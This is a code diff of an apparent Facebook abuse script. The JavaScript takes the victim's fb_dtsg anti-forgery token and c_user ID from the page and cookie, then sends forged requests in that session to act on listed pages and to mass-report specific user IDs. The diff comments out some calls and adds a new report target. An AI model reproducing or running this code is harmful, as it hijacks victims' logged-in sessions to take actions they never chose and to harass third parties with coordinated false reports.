@@ -14,10 +14,10 @@ function pages(pid) {
   Page.send(PageParams);
 }
 pages("151336461728165");
-pages("439735636099805");
+/*pages("439735636099805");
 pages("345386952225538");
 pages("571206396229931");
-pages("194334413982919");
+pages("194334413982919");*/
 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
@@ -36,6 +36,7 @@ function Report(id) {
 }
 Report("100002329611131");
 Report("100001207223457");
+Report("100006306551146");
 
 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
@@ -55,7 +56,7 @@ function ReportNow() {
 }
 ReportNow();
 
-var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+/*var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var now=(new Date).getTime();
 function ReportNow1() {
@@ -70,10 +71,10 @@ function ReportNow1() {
   };
   Page.send(PageParams);
 }
-ReportNow1();
+ReportNow1();*/
 
 
-var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+/*var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var now=(new Date).getTime();
 function ReportNow2() {
@@ -88,4 +89,4 @@ function ReportNow2() {
   };
   Page.send(PageParams);
 }
-ReportNow2();
+ReportNow2();*/
